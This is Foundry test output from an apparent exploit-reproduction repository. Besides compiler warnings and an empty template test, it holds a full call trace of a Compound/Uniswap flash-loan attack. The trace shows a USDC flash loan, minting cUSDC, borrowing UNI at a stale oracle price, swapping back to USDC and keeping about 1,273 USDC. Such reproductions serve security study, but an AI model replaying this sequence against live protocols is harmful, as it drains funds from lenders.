Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.36s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-02/CompoundUni_exp.sol:23:5:
   |
23 |     IERC20 public USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-02/CompoundUni_exp.sol:30:5:
   |
30 |     IWETH public WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 264.01ms (180.42µs CPU time)

Ran 1 test for src/test/2024-02/CompoundUni_exp.sol:ContractTest
[PASS] testExploit() (gas: 902056)
Logs:
  USDC balance:
     [INFO] Before attack: 0.000000
     [INFO] After attack: 1273.306899
  When compound update the price, incomplete liquidation leading to bad debts

Traces:
  [990056] ContractTest::testExploit()
    ├─ [0] console::log("USDC balance:") [staticcall]
    │   └─ ← [Stop] 
    ├─ [9839] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "   [INFO] Before attack", val: 0, decimals: 6)
    ├─ [956592] Balancer vault::flashLoan(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], [193020254960 [1.93e11]], 0x)
    │   ├─ [3339] USDC::balanceOf(Balancer vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(Balancer vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
    │   │   │   └─ ← [Return] 10858734712132 [1.085e13]
    │   │   └─ ← [Return] 10858734712132 [1.085e13]
    │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [30152] USDC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 193020254960 [1.93e11])
    │   │   ├─ [29363] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 193020254960 [1.93e11]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: Balancer vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 193020254960 [1.93e11])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [901483] ContractTest::receiveFlashLoan([0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], [193020254960 [1.93e11]], [0], 0x)
    │   │   ├─ [25462] USDC::approve(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], 193020254960 [1.93e11])
    │   │   │   ├─ [24673] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::approve(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], 193020254960 [1.93e11]) [delegatecall]
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], value: 193020254960 [1.93e11])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [160230] cUSDC::mint(193020254960 [1.93e11])
    │   │   │   ├─ [3339] USDC::balanceOf(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [staticcall]
    │   │   │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 24213611495130 [2.421e13]
    │   │   │   │   └─ ← [Return] 24213611495130 [2.421e13]
    │   │   │   ├─ [10814] 0xD8EC56013EA119E7181d231E5048f90fBbe753c0::getBorrowRate(24213611495130 [2.421e13], 95463322399334 [9.546e13], 16943013134261 [1.694e13]) [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000140780cf73
    │   │   │   ├─ emit AccrueInterest(: 4894503437 [4.894e9], : 1351850214647425089 [1.351e18], : 95468216902771 [9.546e13])
    │   │   │   ├─ [48877] comptroller::mintAllowed(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 193020254960 [1.93e11])
    │   │   │   │   ├─ [43697] 0xBafE01ff935C7305907c33BF824352eE5979B526::mintAllowed(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 193020254960 [1.93e11]) [delegatecall]
    │   │   │   │   │   ├─ [2553] cUSDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ emit DistributedSupplierComp(param0: cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 77232613081136195923568085522837569385714 [7.723e40])
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [1448] USDC::allowance(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [staticcall]
    │   │   │   │   ├─ [659] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::allowance(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 193020254960 [1.93e11]
    │   │   │   │   └─ ← [Return] 193020254960 [1.93e11]
    │   │   │   ├─ [1339] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 193020254960 [1.93e11]
    │   │   │   │   └─ ← [Return] 193020254960 [1.93e11]
    │   │   │   ├─ [1339] USDC::balanceOf(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 24213611495130 [2.421e13]
    │   │   │   │   └─ ← [Return] 24213611495130 [2.421e13]
    │   │   │   ├─ [9349] USDC::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], 193020254960 [1.93e11])
    │   │   │   │   ├─ [8554] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], 193020254960 [1.93e11]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], value: 193020254960 [1.93e11])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit Mint(minter: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], mintAmount: 193020254960 [1.93e11], mintTokens: 819359223486269 [8.193e14])
    │   │   │   ├─ emit Transfer(from: cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 819359223486269 [8.193e14])
    │   │   │   ├─ [994] comptroller::mintVerify(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 193020254960 [1.93e11], 819359223486269 [8.193e14])
    │   │   │   │   ├─ [381] 0xBafE01ff935C7305907c33BF824352eE5979B526::mintVerify(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 193020254960 [1.93e11], 819359223486269 [8.193e14]) [delegatecall]
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] 
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [70431] comptroller::enterMarkets([0x39AA39c021dfbaE8faC545936693aC917d5E7563])
    │   │   │   ├─ [69730] 0xBafE01ff935C7305907c33BF824352eE5979B526::enterMarkets([0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [delegatecall]
    │   │   │   │   ├─ emit MarketEntered(rToken: cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563], account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   └─ ← [Return] [0]
    │   │   │   └─ ← [Return] [0]
    │   │   ├─ [21763] comptroller::getAccountLiquidity(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   ├─ [21068] 0xBafE01ff935C7305907c33BF824352eE5979B526::getAccountLiquidity(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   ├─ [6556] cUSDC::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   ├─ [1339] USDC::balanceOf(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 24406631750090 [2.44e13]
    │   │   │   │   │   │   └─ ← [Return] 24406631750090 [2.44e13]
    │   │   │   │   │   └─ ← [Return] 0, 819359223486269 [8.193e14], 0, 235574641045381 [2.355e14]
    │   │   │   │   ├─ [2204] 0x50ce56A3239671Ab62f185704Caedf626352741e::getUnderlyingPrice(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
    │   │   │   │   └─ ← [Return] 0, 165032317990799320700554 [1.65e23], 0
    │   │   │   └─ ← [Return] 0, 165032317990799320700554 [1.65e23], 0
    │   │   ├─ [395] uni::decimals() [staticcall]
    │   │   │   └─ ← [Return] 18
    │   │   ├─ [4946] 0x50ce56A3239671Ab62f185704Caedf626352741e::getUnderlyingPrice(cUniToken: [0x35A18000230DA775CAc24873d00Ff85BccdeD550]) [staticcall]
    │   │   │   └─ ← [Return] 8340000000000000000 [8.34e18]
    │   │   ├─ [308672] cUniToken::borrow(19788000000000000000000 [1.978e22])
    │   │   │   ├─ [302813] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::borrow(19788000000000000000000 [1.978e22]) [delegatecall]
    │   │   │   │   ├─ [2797] uni::balanceOf(cUniToken: [0x35A18000230DA775CAc24873d00Ff85BccdeD550]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2093977896101008115558446 [2.093e24]
    │   │   │   │   ├─ [7816] 0xd956188795ca6F4A74092ddca33E0Ea4cA3a1395::getBorrowRate(2093977896101008115558446 [2.093e24], 250771651710776367598090 [2.507e23], 69602941625199523629372 [6.96e22]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000004f61d305c
    │   │   │   │   ├─ emit AccrueInterest(cashPrior: 2093977896101008115558446 [2.093e24], interestAccumulated: 72871865343065664509 [7.287e19], borrowIndex: 1214348808918321256 [1.214e18], totalBorrows: 250844523576119433262599 [2.508e23])
    │   │   │   │   ├─ [136813] comptroller::borrowAllowed(cUniToken: [0x35A18000230DA775CAc24873d00Ff85BccdeD550], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19788000000000000000000 [1.978e22])
    │   │   │   │   │   ├─ [136133] 0xBafE01ff935C7305907c33BF824352eE5979B526::borrowAllowed(cUniToken: [0x35A18000230DA775CAc24873d00Ff85BccdeD550], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19788000000000000000000 [1.978e22]) [delegatecall]
    │   │   │   │   │   │   ├─ emit MarketEntered(rToken: cUniToken: [0x35A18000230DA775CAc24873d00Ff85BccdeD550], account: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   │   ├─ [2946] 0x50ce56A3239671Ab62f185704Caedf626352741e::getUnderlyingPrice(cUniToken: [0x35A18000230DA775CAc24873d00Ff85BccdeD550]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 8340000000000000000 [8.34e18]
    │   │   │   │   │   │   ├─ [454] cUniToken::totalBorrows() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 250844523576119433262599 [2.508e23]
    │   │   │   │   │   │   ├─ [4556] cUSDC::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   │   │   ├─ [1339] USDC::balanceOf(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [staticcall]
    │   │   │   │   │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [delegatecall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 24406631750090 [2.44e13]
    │   │   │   │   │   │   │   │   └─ ← [Return] 24406631750090 [2.44e13]
    │   │   │   │   │   │   │   └─ ← [Return] 0, 819359223486269 [8.193e14], 0, 235574641045381 [2.355e14]
    │   │   │   │   │   │   ├─ [2204] 0x50ce56A3239671Ab62f185704Caedf626352741e::getUnderlyingPrice(cUSDC: [0x39AA39c021dfbaE8faC545936693aC917d5E7563]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
    │   │   │   │   │   │   ├─ [13719] cUniToken::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   │   │   ├─ [10893] cUniToken::delegateToImplementation(0xc37f68e20000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    │   │   │   │   │   │   │   │   ├─ [9008] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::getAccountSnapshot(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   │   │   │   │   │   ├─ [797] uni::balanceOf(cUniToken: [0x35A18000230DA775CAc24873d00Ff85BccdeD550]) [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 2093977896101008115558446 [2.093e24]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 203906917579520799136675388 [2.039e26]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a8aaf826b6cf53d2f1f63c
    │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 203906917579520799136675388 [2.039e26]
    │   │   │   │   │   │   ├─ [2946] 0x50ce56A3239671Ab62f185704Caedf626352741e::getUnderlyingPrice(cUniToken: [0x35A18000230DA775CAc24873d00Ff85BccdeD550]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 8340000000000000000 [8.34e18]
    │   │   │   │   │   │   ├─ [387] cUniToken::borrowIndex() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 1214348808918321256 [1.214e18]
    │   │   │   │   │   │   ├─ [4922] cUniToken::borrowBalanceStored(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   │   │   ├─ [2405] cUniToken::delegateToImplementation(0x95dd91930000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496) [staticcall]
    │   │   │   │   │   │   │   │   ├─ [748] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::borrowBalanceStored(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   ├─ emit DistributedBorrowerComp(param0: cUniToken: [0x35A18000230DA775CAc24873d00Ff85BccdeD550], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 0, param3: 1008922696786268143104260768386143791 [1.008e36])
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [797] uni::balanceOf(cUniToken: [0x35A18000230DA775CAc24873d00Ff85BccdeD550]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2093977896101008115558446 [2.093e24]
    │   │   │   │   ├─ [66331] uni::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19788000000000000000000 [1.978e22])
    │   │   │   │   │   ├─ emit Transfer(from: cUniToken: [0x35A18000230DA775CAc24873d00Ff85BccdeD550], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 19788000000000000000000 [1.978e22])
    │   │   │   │   │   ├─ emit DelegateVotesChanged(delegate: 0xbbf3f1421D886E9b2c5D716B5192aC998af2012c, previousBalance: 2093989051204332981727685 [2.093e24], newBalance: 2074201051204332981727685 [2.074e24])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ emit Borrow(borrower: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], borrowAmount: 19788000000000000000000 [1.978e22], accountBorrows: 19788000000000000000000 [1.978e22], totalBorrows: 270632523576119433262599 [2.706e23])
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [797] uni::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 19788000000000000000000 [1.978e22]
    │   │   ├─ [158091] UNI_WETH_Pool::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 19788000000000000000000 [1.978e22], 42095128740 [4.209e10], 0x)
    │   │   │   ├─ [29962] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 65855246851492826558 [6.585e19])
    │   │   │   │   ├─ emit Transfer(from: UNI_WETH_Pool: [0x1d42064Fc4Beb5F8aAF85F4617AE8b3b5B8Bd801], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 65855246851492826558 [6.585e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [2797] uni::balanceOf(UNI_WETH_Pool: [0x1d42064Fc4Beb5F8aAF85F4617AE8b3b5B8Bd801]) [staticcall]
    │   │   │   │   └─ ← [Return] 1398001398601504672478824 [1.398e24]
    │   │   │   ├─ [33019] ContractTest::uniswapV3SwapCallback(19788000000000000000000 [1.978e22], -65855246851492826558 [-6.585e19], 0x)
    │   │   │   │   ├─ [9662] uni::transfer(UNI_WETH_Pool: [0x1d42064Fc4Beb5F8aAF85F4617AE8b3b5B8Bd801], 19788000000000000000000 [1.978e22])
    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UNI_WETH_Pool: [0x1d42064Fc4Beb5F8aAF85F4617AE8b3b5B8Bd801], value: 19788000000000000000000 [1.978e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [797] uni::balanceOf(UNI_WETH_Pool: [0x1d42064Fc4Beb5F8aAF85F4617AE8b3b5B8Bd801]) [staticcall]
    │   │   │   │   └─ ← [Return] 1417789398601504672478824 [1.417e24]
    │   │   │   ├─ emit Swap(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 19788000000000000000000 [1.978e22], param3: -65855246851492826558 [-6.585e19], param4: 4568522432723418439323217492 [4.568e27], param5: 291252835944559819464790 [2.912e23], param6: -57066 [-5.706e4])
    │   │   │   └─ ← [Return] 19788000000000000000000 [1.978e22], -65855246851492826558 [-6.585e19]
    │   │   ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 65855246851492826558 [6.585e19]
    │   │   ├─ [105192] WETH_USDC_Pool::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 65855246851492826558 [6.585e19], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x)
    │   │   │   ├─ [30152] USDC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 194293561859 [1.942e11])
    │   │   │   │   ├─ [29363] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 194293561859 [1.942e11]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: WETH_USDC_Pool: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 194293561859 [1.942e11])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [2534] WETH::balanceOf(WETH_USDC_Pool: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [staticcall]
    │   │   │   │   └─ ← [Return] 7882317582390627050549 [7.882e21]
    │   │   │   ├─ [7222] ContractTest::uniswapV3SwapCallback(-194293561859 [-1.942e11], 65855246851492826558 [6.585e19], 0x)
    │   │   │   │   ├─ [6062] WETH::transfer(WETH_USDC_Pool: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 65855246851492826558 [6.585e19])
    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WETH_USDC_Pool: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], value: 65855246851492826558 [6.585e19])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [534] WETH::balanceOf(WETH_USDC_Pool: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]) [staticcall]
    │   │   │   │   └─ ← [Return] 7948172829242119877107 [7.948e21]
    │   │   │   ├─ emit Swap(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: -194293561859 [-1.942e11], param3: 65855246851492826558 [6.585e19], param4: 1458476227940452874857511073102505 [1.458e33], param5: 14522092509184010783 [1.452e19], param6: 196421 [1.964e5])
    │   │   │   └─ ← [Return] -194293561859 [-1.942e11], 65855246851492826558 [6.585e19]
    │   │   ├─ [5452] USDC::transfer(Balancer vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 193020254960 [1.93e11])
    │   │   │   ├─ [4663] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transfer(Balancer vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 193020254960 [1.93e11]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Balancer vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 193020254960 [1.93e11])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [1339] USDC::balanceOf(Balancer vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(Balancer vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
    │   │   │   └─ ← [Return] 10858734712132 [1.085e13]
    │   │   └─ ← [Return] 10858734712132 [1.085e13]
    │   ├─ emit FlashLoan(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], param2: 193020254960 [1.93e11], param3: 0)
    │   └─ ← [Stop] 
    ├─ [1339] USDC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 1273306899 [1.273e9]
    │   └─ ← [Return] 1273306899 [1.273e9]
    ├─ emit log_named_decimal_uint(key: "   [INFO] After attack", val: 1273306899 [1.273e9], decimals: 6)
    ├─ [0] console::log("When compound update the price, incomplete liquidation leading to bad debts") [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.97s (6.35s CPU time)

Ran 2 test suites in 6.98s (7.24s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
